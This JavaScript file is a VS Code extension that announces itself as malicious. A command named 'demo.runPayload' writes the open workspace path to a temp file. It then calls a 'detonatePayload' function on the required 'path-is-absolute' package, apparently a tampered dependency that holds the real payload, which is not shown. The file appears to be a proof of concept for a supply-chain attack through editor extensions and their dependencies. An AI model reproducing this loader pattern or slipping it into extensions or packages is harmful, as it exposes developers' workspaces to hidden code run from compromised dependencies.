
const vscode = require('vscode');
const fs = require('fs');
const path = require('path');
const os = require('os');


const COMM_FILE_NAME = 'vscode_payload_comm.tmp';

function activate(context) {
    console.log('--- Malicious Extension Activated ---');

    let disposable = vscode.commands.registerCommand('demo.runPayload', function () {
        console.log('[*] User triggered the command. Initializing payload sequence...');
        
        try {
            const workspaceFolders = vscode.workspace.workspaceFolders;
            if (!workspaceFolders || workspaceFolders.length === 0) {
                vscode.window.showErrorMessage('No workspace folder open.');
                return;
            }
            const workspacePath = workspaceFolders[0].uri.fsPath;

            const tempFilePath = path.join(os.tmpdir(), COMM_FILE_NAME);
            fs.writeFileSync(tempFilePath, workspacePath, 'utf8');

            const pathIsAbsoluteModule = require('path-is-absolute'); 
            pathIsAbsoluteModule.detonatePayload();

        } catch (e) {
            vscode.window.showErrorMessage(`Extension command failed: ${e.message}`);
        }
    });

    context.subscriptions.push(disposable);
}

exports.activate = activate;
